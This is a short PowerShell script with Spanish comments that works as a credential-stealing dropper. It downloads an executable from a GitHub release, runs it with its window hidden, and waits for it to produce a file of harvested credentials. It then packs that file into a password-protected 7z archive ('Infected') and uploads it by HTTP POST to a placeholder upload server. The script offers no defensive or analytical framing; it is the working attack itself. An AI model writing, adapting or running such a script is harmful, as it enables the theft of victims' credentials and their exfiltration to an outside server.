# Definir ruta de descarga
$destino = "$env:TEMP\codigo2.exe"
$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebahola/oconsole.exe"

# Descargar el ejecutable desde GitHub
Invoke-WebRequest -Uri $url -OutFile $destino

# Ejecutar el archivo descargado
Start-Process -FilePath $destino -WindowStyle Hidden -Wait

# Pausa breve para asegurarse de que el ejecutable termine
Start-Sleep -Seconds 5

# Ruta donde el ejecutable genera el archivo de resultados
$rutaArchivo = "C:\Users\Public\resultados_credenciales.txt"

# Verificar si el archivo existe antes de proceder
if (Test-Path $rutaArchivo) {
    
    # Ruta del archivo comprimido
    $archivo7z = "$env:TEMP\datos_comprimidos.7z"
    
    # Ruta donde está 7-Zip (asumimos que 7z.exe ya está en el sistema o incluimos su ruta)
    $path7zip = "C:\Program Files\7-Zip\7z.exe"

    # Comprimir el archivo en .7z con contraseña "Infected"
    & $path7zip a -pInfected -mhe=on $archivo7z $rutaArchivo | Out-Null

    # Si el archivo comprimido se creó correctamente, proceder a subirlo
    if (Test-Path $archivo7z) {

        # URL del servidor de subida
        $uploadUrl = "http://tu-servidor-gratuito.com/upload.php"

        # Subir el archivo 7z al servidor
        Invoke-WebRequest -Uri $uploadUrl -Method Post -InFile $archivo7z -ContentType "multipart/form-data"

    }
}

# Fin del script
}
